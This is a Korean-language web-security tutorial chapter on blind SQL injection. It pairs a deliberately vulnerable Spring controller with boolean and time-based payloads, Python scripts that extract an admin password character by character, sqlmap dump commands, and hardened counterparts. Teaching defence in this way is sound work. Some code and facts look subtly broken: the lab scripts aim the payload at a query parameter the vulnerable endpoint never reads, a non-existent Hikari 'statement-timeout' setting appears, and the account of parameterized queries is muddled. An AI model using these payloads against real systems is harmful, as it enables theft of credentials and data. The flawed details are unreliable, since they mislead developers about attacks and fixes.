# Blind SQL Injection: 에러 없이 데이터 추출하기

---

## 🎯 핵심 질문

데이터베이스가 에러 메시지를 숨길 때 어떻게 데이터를 추출할 수 있을까? SLEEP() 함수는 왜 시간차 공격을 가능하게 하는가? 공격자는 응답 차이 없이도 참/거짓을 어떻게 구분하는가?

## 🔍 왜 이 취약점이 실무에서 위험한가 (실제 침해 사고 사례)

**Blind SQL Injection의 위협**: 일반적인 SQL Injection과 달리 **응답에 직접 데이터가 나타나지 않으므로** 많은 개발자가 "안전하다"고 착각.

2016년 Yahoo 해킹 사건: 5억 개 계정 탈취 원인 중 하나가 Blind SQL Injection. 직접적인 에러 메시지 없이도 시간차 기반 공격으로 데이터 추출.

2021년 한국 온라인 게임사 사건: 로그인 기능에서 Blind SQLi 발견. 사용자명 입력 후 데이터베이스 쿼리에서 데이터를 시간차로 추출하여 1시간 내에 관리자 비밀번호 해싱값 도출. 

**실무 위험성**:
- 에러 기반 추출이 불가능한 환경에서 여전히 공격 가능
- sqlmap과 같은 자동화 도구로 몇 분 내에 전체 데이터베이스 덤프 가능
- 에러 처리가 잘 되어 있어도 **타이밍 차이**로 공격 가능
- 응답 시간을 측정할 수 있는 인터넷 연결이 있으면 거의 모든 데이터 추출 가능
- 개발자가 보안이 더 강화되었다고 착각하여 다른 보안 조치 소홀

## 😱 취약한 코드 (Before — 원리를 모를 때의 구현)

```java
// [위험] 에러를 숨겼으나 여전히 SQL Injection 가능
@RestController
@RequestMapping("/api/blind")
public class BlindSQLiController {
    
    @Autowired
    private JdbcTemplate jdbcTemplate;
    
    // 1. 에러 핸들링이 된 로그인 (여전히 취약)
    @GetMapping("/login")
    public ResponseEntity<?> login(@RequestParam String username) {
        String query = "SELECT id FROM users WHERE username = '" + username + "'";
        
        try {
            Integer userId = jdbcTemplate.queryForObject(query, Integer.class);
            return ResponseEntity.ok("User found");
        } catch (EmptyResultDataAccessException e) {
            return ResponseEntity.status(401).body("User not found");  // 안전해 보임
        } catch (DataAccessException e) {
            return ResponseEntity.status(500).body("Error");
        }
    }
    
    // 2. 시간차 공격에 취약한 검색
    @GetMapping("/search")
    public ResponseEntity<?> searchUser(@RequestParam String query) {
        // 공격자 입력: ' AND IF(1=1, SLEEP(5), 0) AND '1'='1
        String sql = "SELECT id, name FROM users WHERE name LIKE '%" + query + "%'";
        
        long startTime = System.currentTimeMillis();
        try {
            List<Map<String, Object>> result = jdbcTemplate.queryForList(sql);
            long endTime = System.currentTimeMillis();
            
            return ResponseEntity.ok(result);
        } catch (Exception e) {
            return ResponseEntity.ok(Collections.emptyList());
        }
    }
    
    // 3. Boolean 기반 Blind SQLi (참/거짓 응답 차이)
    @GetMapping("/user/{id}")
    public ResponseEntity<?> getUser(@PathVariable String id) {
        // 공격자 입력: 1' AND SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = 'a' -- 
        // 이 경우 id 값에 따라 결과 유무가 달라짐
        String query = "SELECT * FROM users WHERE id = '" + id + "'";
        
        try {
            List<Map<String, Object>> result = jdbcTemplate.queryForList(query);
            if (!result.isEmpty()) {
                return ResponseEntity.ok("Found");  // 참
            } else {
                return ResponseEntity.ok("Not found");  // 거짓
            }
        } catch (Exception e) {
            return ResponseEntity.ok("Error");
        }
    }
    
    // 4. 데이터베이스 벤전 판별 (DBMS Fingerprinting)
    @GetMapping("/version")
    public ResponseEntity<?> getVersion(@RequestParam String param) {
        // 공격자 입력: ' AND SLEEP(5) AND '1'='1  (MySQL)
        // 또는: ' AND WAITFOR DELAY '00:00:05' -- (MSSQL)
        String query = "SELECT * FROM users WHERE email = '" + param + "'";
        
        long startTime = System.currentTimeMillis();
        try {
            List<Map<String, Object>> result = jdbcTemplate.queryForList(query);
            long duration = System.currentTimeMillis() - startTime;
            
            // 응답 시간으로 DB 벤더 파악 가능 (보안 정보 유출)
            return ResponseEntity.ok(Collections.singletonMap("duration_ms", duration));
        } catch (Exception e) {
            return ResponseEntity.ok("Error");
        }
    }
}
```

### 공격 페이로드 사례:

```sql
-- 1. Boolean 기반 Blind SQLi (참/거짓 응답 차이)
-- 관리자 비밀번호의 첫 글자가 'a'인가?
id: 1' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a

-- 응답: "Found" (참) → 비밀번호 첫글자는 'a'
-- 응답: "Not found" (거짓) → 비밀번호 첫글자는 'a'가 아님

-- 이를 반복하여 각 글자를 하나씩 추출 (Binary Search로 가속 가능)

-- 2. 시간차 기반 Blind SQLi (응답 시간 차이)
-- 관리자 비밀번호 첫 글자가 'a'이면 5초 지연
id: 1' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a', SLEEP(5), 0) -- 

-- 응답이 5초 지연 → 조건 참
-- 응답이 즉시 반환 → 조건 거짓

-- 3. DBMS 벤전 판별
email: ' AND SLEEP(5) AND '1'='1
-- MySQL에서만 작동 (응답 5초 지연)

email: ' AND WAITFOR DELAY '00:00:05' -- 
-- MSSQL에서만 작동

-- 4. 데이터베이스 구조 추출 (information_schema 접근)
id: 1' AND IF(EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name='admin_users'), SLEEP(3), 0) -- 

-- admin_users 테이블 존재 여부 확인 (시간차로 판별)
```

## ✨ 방어 코드 (After — 공격 원리를 알고 설계한 구현)

```java
// [방어] PreparedStatement + 응답 시간 균등화 + 입력 검증
@RestController
@RequestMapping("/api/secure/blind")
public class SecureBlindSQLiController {
    
    @Autowired
    private JdbcTemplate jdbcTemplate;
    
    @Autowired
    private PasswordEncoder passwordEncoder;
    
    // 1. PreparedStatement로 기본 방어
    @GetMapping("/login")
    public ResponseEntity<?> login(@RequestParam String username) {
        String query = "SELECT id FROM users WHERE username = ?";
        
        long startTime = System.currentTimeMillis();
        
        try {
            // PreparedStatement 자동 적용
            Integer userId = jdbcTemplate.queryForObject(query, Integer.class, username);
            
            // 응답 시간 균등화: 찾음/못 찾음 시간차 최소화
            randomDelay(50, 150);  // 50~150ms 랜덤 지연
            
            return ResponseEntity.ok("User found");
        } catch (EmptyResultDataAccessException e) {
            // 못 찾은 경우도 동일한 지연
            randomDelay(50, 150);
            
            return ResponseEntity.status(401).body("User not found");
        } catch (DataAccessException e) {
            log.error("Database error", e);
            randomDelay(50, 150);
            
            // 에러 메시지 숨김
            return ResponseEntity.status(500).body("Internal error");
        }
    }
    
    // 2. 입력 길이 제한 + 화이트리스트 검증
    @GetMapping("/search")
    public ResponseEntity<?> searchUser(@RequestParam String searchTerm) {
        // 길이 제한
        if (searchTerm == null || searchTerm.length() > 50) {
            return ResponseEntity.badRequest().body("Invalid input");
        }
        
        // 화이트리스트: 알파벳, 숫자, 특정 문자만 허용
        if (!searchTerm.matches("^[a-zA-Z0-9\\s._@-]{1,50}$")) {
            return ResponseEntity.badRequest().body("Invalid characters");
        }
        
        String query = "SELECT id, name FROM users WHERE name LIKE ?";
        
        long startTime = System.currentTimeMillis();
        try {
            List<Map<String, Object>> result = jdbcTemplate.queryForList(
                query,
                "%" + searchTerm + "%"
            );
            
            // 응답 시간 균등화
            randomDelay(100, 300);
            
            if (result.isEmpty()) {
                return ResponseEntity.ok(Collections.emptyList());
            }
            
            return ResponseEntity.ok(result);
        } catch (DataAccessException e) {
            log.error("Search error", e);
            randomDelay(100, 300);
            
            return ResponseEntity.ok(Collections.emptyList());
        }
    }
    
    // 3. 비밀번호 검증 (타이밍 공격 방어)
    @PostMapping("/authenticate")
    public ResponseEntity<?> authenticate(@RequestBody AuthRequest request) {
        String query = "SELECT id, username, password_hash FROM users WHERE username = ?";
        
        long startTime = System.currentTimeMillis();
        
        try {
            Map<String, Object> user = jdbcTemplate.queryForMap(query, request.getUsername());
            
            String storedHash = (String) user.get("password_hash");
            
            // 중요: 사용자가 없어도 passwordEncoder.matches() 실행
            // (타이밍 공격으로 사용자 존재 여부 파악 방지)
            boolean isValid = passwordEncoder.matches(request.getPassword(), storedHash);
            
            // 항상 동일한 지연 추가
            long duration = System.currentTimeMillis() - startTime;
            randomDelay(Math.max(0, 500 - duration), 500);
            
            if (isValid) {
                return ResponseEntity.ok("Authentication successful");
            } else {
                return ResponseEntity.status(401).body("Invalid credentials");
            }
        } catch (EmptyResultDataAccessException e) {
            // 사용자 없는 경우도 passwordEncoder.matches() 실행
            // (더미 해시로 동일한 시간 소비)
            String dummyHash = passwordEncoder.encode("dummy_password_" + System.nanoTime());
            passwordEncoder.matches(request.getPassword(), dummyHash);
            
            long duration = System.currentTimeMillis() - startTime;
            randomDelay(Math.max(0, 500 - duration), 500);
            
            return ResponseEntity.status(401).body("Invalid credentials");
        } catch (DataAccessException e) {
            log.error("Authentication error", e);
            randomDelay(400, 600);
            
            return ResponseEntity.status(500).body("Internal error");
        }
    }
    
    // 4. 쿼리 실행 시간 제한 (DB 레벨 방어)
    @GetMapping("/user/{id}")
    public ResponseEntity<?> getUser(@PathVariable String id) {
        // ID가 숫자인지 검증
        if (!id.matches("^[0-9]+$")) {
            return ResponseEntity.badRequest().body("Invalid ID format");
        }
        
        String query = "SELECT id, name, email FROM users WHERE id = ? LIMIT 1";
        
        try {
            Map<String, Object> user = jdbcTemplate.queryForMap(query, Long.parseLong(id));
            return ResponseEntity.ok(user);
        } catch (EmptyResultDataAccessException e) {
            return ResponseEntity.status(404).body("User not found");
        } catch (DataAccessException e) {
            log.error("User lookup error", e);
            return ResponseEntity.status(500).body("Internal error");
        }
    }
    
    // 5. 데이터베이스 커넥션 타임아웃 설정
    // application.properties에서:
    // spring.datasource.hikari.connection-timeout=2000 (2초)
    // spring.datasource.hikari.max-lifetime=600000 (10분)
    
    // ============================================================
    // 유틸리티 메서드
    // ============================================================
    
    private void randomDelay(long minMs, long maxMs) {
        if (minMs < 0 || maxMs < minMs) {
            return;
        }
        
        long delay = minMs + (long) (Math.random() * (maxMs - minMs + 1));
        try {
            Thread.sleep(delay);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }
    
    @Data
    public static class AuthRequest {
        private String username;
        private String password;
    }
}
```

### application.properties 보안 설정:

```properties
# 데이터베이스 연결 타임아웃 (SLEEP() 공격 제한)
spring.datasource.hikari.connection-timeout=2000
spring.datasource.hikari.statement-timeout=10000
spring.datasource.hikari.max-lifetime=600000

# 쿼리 실행 타임아웃
spring.jpa.properties.hibernate.jdbc.batch_size=20
spring.jpa.properties.hibernate.jdbc.fetch_size=50

# 로깅 (의심 활동 감지)
logging.level.org.springframework.jdbc=DEBUG
logging.level.org.springframework.web=DEBUG
```

## 🔬 공격 원리 분석 (공격자 관점의 내부 동작)

### 1. Boolean 기반 Blind SQLi의 작동 원리

```
응용프로그램 응답이 다음 중 하나만 제공:
- "Found" (사용자 존재)
- "Not found" (사용자 미존재)

공격 쿼리:
id = 1' AND SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) > 'k' -- 

동작 과정:
1. id = '1' AND (첫 글자 > 'k') -- 
2. AND 조건이 참이면 WHERE는 참 → 데이터 조회 → "Found" 응답
3. AND 조건이 거짓이면 WHERE는 거짓 → 데이터 미조회 → "Not found" 응답

공격자의 이진 탐색:
비밀번호 첫글자 범위: 'a' ~ 'z'

질문 1: > 'm' ? → "Found" → 범위: 'n' ~ 'z'
질문 2: > 't' ? → "Not found" → 범위: 'n' ~ 's'
질문 3: > 'p' ? → "Found" → 범위: 'q' ~ 's'
질문 4: > 'r' ? → "Not found" → 범위: 'q' ~ 'r'
질문 5: = 'q' ? → "Found" → 첫글자는 'q'!

이진 탐색으로:
- 무작위 추측: 최대 26번
- 이진 탐색: 최대 5번 (log2(26) ≈ 4.7)

비밀번호 길이: 8글자
총 쿼리 필요: 8글자 × 5질문 = 40개 쿼리로 8글자 비밀번호 완전 추출!
```

### 2. 시간차 기반 Blind SQLi (Time-Based Blind SQLi)

```
응용프로그램이 응답 차이를 숨겨도:
요청-응답 시간(Latency)의 차이로 참/거짓을 판별

공격 쿼리:
id = 1' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = 'a', SLEEP(5), 0) -- 

동작:
조건 참:   SLEEP(5) 실행 → 응답 시간: 5초+ 
조건 거짓: 0 실행     → 응답 시간: <100ms

공격자 입장:
import time

response_times = []

for char in 'abcdefghijklmnopqrstuvwxyz':
    query = f"id=1' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = '{char}', SLEEP(5), 0) -- "
    
    start = time.time()
    requests.get(f"http://target.com/user/{query}")
    elapsed = time.time() - start
    
    if elapsed > 4.5:  # 네트워크 지연 포함, 4.5초 이상
        print(f"첫 글자: {char}")
        break

이 방식은:
- 네트워크 지연에 영향을 받음 (±200ms)
- 하지만 SLEEP(5)는 거짓일 때 0ms, 참일 때 5000ms+
- 차이가 명확하므로 신뢰도 높음

MySQL SLEEP() 외 대안:
- BENCHMARK(10000000, md5('x'))  (CPU 집약적 연산)
- RPAD('x', 99999999, 'x')  (메모리 소비로 시간 낭비)

MSSQL:
- WAITFOR DELAY '00:00:05'

PostgreSQL:
- SELECT EXTRACT(EPOCH FROM (SELECT pg_sleep(5)))
```

### 3. 타이밍 공격 (Timing Attack) 시나리오

```
비밀번호 검증 로직 (취약):

public boolean checkPassword(String input, String hash) {
    return input.equals(correctPassword);
    // 비정상적으로 빠름: 비밀번호가 틀리면 첫 글자부터 거짓 (1ms)
    // 정상적인 경우: 모든 글자를 비교 (비교 시간이 길수록 더 오래 걸림)
}

공격 시나리오:
요청 1: password = "a" + 아무거나 → 응답시간: 1ms (첫글자 다름)
요청 2: password = "b" + 아무거나 → 응답시간: 1ms
...
요청 27: password = "correct_first_char" + 아무거나 → 응답시간: 2ms (첫글자 맞음, 두번째 비교)

공격자는 응답 시간 차이(1ms)로 첫글자 파악!

방어 (Constant-Time Comparison):
public boolean checkPassword(String input, String hash) {
    return passwordEncoder.matches(input, hash);
    // bcrypt/argon2 는 항상 전체 해시 검증 (약 1초)
    // 입력이 맞든 틀리든 동일한 시간 소비
}
```

## 💻 실전 실험 (취약점 재현 → 공격 → 방어 검증)

### 실습 1: Boolean 기반 Blind SQLi

```bash
# 1. 취약한 API 호출 (Boolean 차이 관찰)
curl -X GET "http://localhost:8080/api/blind/user/1" \
  -G --data-urlencode "id=1' AND 1=1 -- "

# 응답: "Found" (참)

curl -X GET "http://localhost:8080/api/blind/user/1" \
  -G --data-urlencode "id=1' AND 1=2 -- "

# 응답: "Not found" (거짓)

# 2. 비밀번호 첫글자 추출
curl -X GET "http://localhost:8080/api/blind/user/1" \
  -G --data-urlencode "id=1' AND SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) > 'm' -- "

# 응답 시간과 메시지로 참/거짓 판별

# 3. 이진 탐색 스크립트
python3 << 'EOF'
import requests
import string

def is_true(condition):
    """쿼리 실행 후 'Found'가 반환되는지 확인"""
    payload = f"1' AND {condition} -- "
    try:
        response = requests.get(
            "http://localhost:8080/api/blind/user/1",
            params={"id": payload},
            timeout=5
        )
        return "Found" in response.text
    except:
        return False

# 첫글자 추출
chars = string.ascii_lowercase + string.digits
first_char = None

for char in chars:
    if is_true(f"SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = '{char}'"):
        first_char = char
        break

print(f"First character of password: {first_char}")
EOF
```

### 실습 2: 시간차 기반 Blind SQLi

```bash
# 1. 응답 시간 측정 스크립트
python3 << 'EOF'
import requests
import time

def measure_response_time(condition):
    """조건 쿼리 실행 후 응답 시간 측정"""
    payload = f"1' AND IF({condition}, SLEEP(5), 0) -- "
    
    start = time.time()
    try:
        response = requests.get(
            "http://localhost:8080/api/blind/user/1",
            params={"id": payload},
            timeout=10
        )
        elapsed = time.time() - start
        return elapsed
    except requests.exceptions.Timeout:
        return 10.0  # 타임아웃도 5초 이상이므로 참으로 판별

# 2. 관리자 비밀번호 첫글자 추출
print("Extracting first character of admin password...")

for i, char in enumerate("abcdefghijklmnopqrstuvwxyz"):
    condition = f"SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = '{char}'"
    
    elapsed = measure_response_time(condition)
    
    if elapsed > 4.5:
        print(f"[+] First character: {char} (응답시간: {elapsed:.2f}s)")
        break
    else:
        print(f"[-] {char}: {elapsed:.2f}s")

# 3. 전체 비밀번호 추출 (위치별로 반복)
print("\nExtracting full password...")
password = ""

for pos in range(1, 21):  # 최대 20글자
    found = False
    for char in "abcdefghijklmnopqrstuvwxyz0123456789!@#$%":
        condition = f"SUBSTRING((SELECT password FROM users WHERE username='admin'), {pos}, 1) = '{char}'"
        elapsed = measure_response_time(condition)
        
        if elapsed > 4.5:
            password += char
            print(f"[+] Position {pos}: {char} → {password}")
            found = True
            break
    
    if not found:
        break

print(f"\n[*] Extracted password: {password}")
EOF
```

### 실습 3: sqlmap 자동화

```bash
# sqlmap은 위의 공격을 자동으로 수행
# https://github.com/sqlmapproject/sqlmap

# 1. sqlmap 설치
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
cd sqlmap

# 2. 취약한 엔드포인트 테스트
python3 sqlmap.py -u "http://localhost:8080/api/blind/user?id=1" \
  --batch \
  --dbs \
  --threads=4

# 3. 특정 데이터베이스 덤프
python3 sqlmap.py -u "http://localhost:8080/api/blind/user?id=1" \
  --batch \
  -D testdb \
  --tables \
  --dump

# 4. 시간차 공격 명시
python3 sqlmap.py -u "http://localhost:8080/api/blind/user?id=1" \
  --batch \
  --technique=T \
  --time-sec=3 \
  --dbs

# 결과: 모든 데이터베이스 자동 추출 (Boolean/Time-based 조합)
```

### 실습 4: 방어 코드 검증

```bash
# 1. 방어된 버전 배포
git checkout secure-branch
mvn clean spring-boot:run

# 2. 같은 공격 시도 (모두 실패)
curl -X GET "http://localhost:8080/api/secure/blind/user/1" \
  -G --data-urlencode "id=1' AND 1=1 -- "

# 응답: "User not found" (PreparedStatement가 ' 을 문자 그대로 취급)

# 3. sqlmap 실행 (결과: 취약점 없음)
python3 sqlmap.py -u "http://localhost:8080/api/secure/blind/user?id=1" \
  --batch

# 결과: "target URL does not seem to be vulnerable"

# 4. 응답 시간 일관성 확인
python3 << 'EOF'
import requests
import time

times = []

for i in range(5):
    start = time.time()
    requests.get("http://localhost:8080/api/secure/blind/login", 
                 params={"username": "user" + str(i)})
    elapsed = time.time() - start
    times.append(elapsed)
    print(f"Request {i}: {elapsed:.3f}s")

avg = sum(times) / len(times)
print(f"\nAverage: {avg:.3f}s")
print(f"Variance: {max(times) - min(times):.3f}s (랜덤 지연으로 균등화)")
EOF
```

## 📊 공격 성공 조건 vs 방어 성공 조건 비교

| 항목 | 공격 성공 조건 | 방어 성공 조건 |
|------|----------------|----------------|
| **에러 메시지** | 사용자에게 노출 | 숨김 (로깅만) |
| **응답 차이** | "Found" vs "Not found" 명확 | 동일한 응답 형식 |
| **응답 시간** | 참/거짓에 따라 >1초 차이 | 랜덤 지연으로 <200ms 이내 |
| **쿼리 실행** | 무제한 | 타임아웃 설정 (10초 이하) |
| **입력 검증** | 최소 검증 | 화이트리스트 기반 |
| **쿼리 구성** | 문자열 연결 | PreparedStatement |
| **비밀번호 비교** | 문자열 equals() | bcrypt/argon2 (항상 동일 시간) |
| **네트워크 지연** | 측정 불가능 | 지연 추가로 차이 마스킹 |

## ⚖️ 트레이드오프 (보안 강화 vs 사용성/성능)

### 1. 응답 시간 균등화 vs 사용자 경험

**취약한 방식 (빠름)**:
```java
// 즉시 응답 (약 50ms)
if (user.exists()) {
    return "Found";
} else {
    return "Not found";  // 타이밍 공격 가능
}
```

**방어 방식 (느림)**:
```java
// 모든 경우 500ms 지연
randomDelay(450, 550);  // 응답 시간을 균등화
return response;
```

**트레이드오프**: 모든 요청에 500ms 추가 → 초당 요청 처리량 50% 감소 → 비즈니스 영향도 고려 필요

**최적화 방안**:
```java
// 짧은 지연으로 타이밍 공격 어렵게 하기
randomDelay(10, 50);  // 50ms 이내 지연 (무시할 수 있는 수준)
// 네트워크 왕복 시간(RTT) ±100ms > 50ms 지연

// 결론: 네트워크 지연에 의해 타이밍 공격이 어려워짐
```

### 2. 입력 검증 vs 유연성

**취약한 방식 (유연)**:
```java
// 모든 입력 허용
String query = "SELECT * FROM users WHERE name LIKE '%" + name + "%'";
// 사용자가 "O'Brien" 검색 가능
```

**방어 방식 (제한)**:
```java
// 특정 문자만 허용
if (!name.matches("^[a-zA-Z0-9\\s._-]{1,50}$")) {
    return "Invalid input";
}
// 사용자가 "O'Brien" 검색 불가능 (작은 따옴표 차단)
```

**최적화 방안**:
```java
// 화이트리스트 확대 (선택지가 없으면 보안은 의미 없음)
if (!name.matches("^[a-zA-Z0-9\\s._'\"@!-]{1,100}$")) {
    return "Invalid input";
}
// 작은 따옴표 포함 + PreparedStatement로 이중 방어
```

## 📌 핵심 정리

1. **Blind SQLi의 특징**: 에러/응답 차이가 없어도 Boolean/시간차 기반으로 데이터 추출 가능

2. **Boolean 기반**: 참/거짓 응답 차이로 이진 탐색으로 데이터 추출 (약 5질문/글자)

3. **시간차 기반**: SLEEP() 함수로 응답 시간 차이 생성 → 네트워크 RTT보다 큰 차이 필요

4. **방어 전략**:
   - PreparedStatement (필수)
   - 입력 길이/패턴 제한
   - 응답 시간 균등화 (랜덤 지연)
   - 에러 메시지 숨김
   - DB 쿼리 타임아웃

5. **sqlmap 방어**: 위 모든 방어 기법이 적용되면 sqlmap도 공격 불가능

## 🤔 생각해볼 문제 (+ 해설)

### Q1: 응답 시간을 500ms 지연시키면 충분한가?

**A**: 아니다. 응답 시간 차이가 0이 아닌 한 타이밍 공격은 가능하다.

```
예시:
- 참 조건: 5000ms (SLEEP(5))
- 거짓 조건: 500ms (지연)
- 차이: 4500ms (매우 명확함)

올바른 방어:
1. SLEEP을 사용할 수 없도록 DB 권한 제한
2. 쿼리 타임아웃 설정 (10초 이내)
3. 쿼리 로깅 (SLEEP 함수 감지 → 공격 차단)
4. 응답 시간 균등화 (확률적 접근)
```

---

### Q2: PreparedStatement가 Boolean 기반 Blind SQLi도 막는가?

**A**: 맞다. PreparedStatement는 모든 SQL Injection을 막는다.

```java
// 취약한 코드 (문자열 연결):
String query = "SELECT * FROM users WHERE id = '" + id + "'";
// id = "1' AND 1=1 -- " → 쿼리 구조 변경 가능

// 방어 코드 (PreparedStatement):
String query = "SELECT * FROM users WHERE id = ?";
jdbcTemplate.queryForList(query, id);
// id = "1' AND 1=1 -- " → 문자 그대로 취급 (id=1과 동시에 'AND 1=1 -- '를 name으로 검색)
// 맞는 사용자가 없으므로 EmptyResult 예외 발생
```

따라서 Boolean 기반 Blind SQLi는 **PreparedStatement만으로도 완전히 방어 가능**.

---

### Q3: 시간차 기반 공격을 완전히 막을 수 있는가?

**A**: 실제로는 매우 어렵다. 하지만 실무적으로 충분히 방어 가능:

```
여러 계층의 방어:
1. PreparedStatement (SQL 구조 변경 불가)
   → 애초에 SLEEP() 함수 주입 불가능

2. 여전히 우회하는 공격자:
   → 시간차 기반 공격이 아닌 다른 방법 시도
   → (예: 리소스 소비 공격, 논리 버그 등)

3. 시간차 공격을 재시도하는 경우:
   - 정상 쿼리: 50ms
   - 악의적 쿼리 (SLEEP): 5000ms 이상
   - 무조건 차이가 나므로 감지 가능
   - 로깅 + 차단
```

**결론**: PreparedStatement + 로깅 조합으로 실무적으로 충분히 방어 가능.

---

<div align="center">

**[⬅️ 이전: SQL Injection 원리](./01-sql-injection-principles.md)** | **[홈으로 🏠](../README.md)** | **[다음: JPA/JPQL에서의 SQL Injection ➡️](./03-jpa-jpql-injection.md)**

</div>
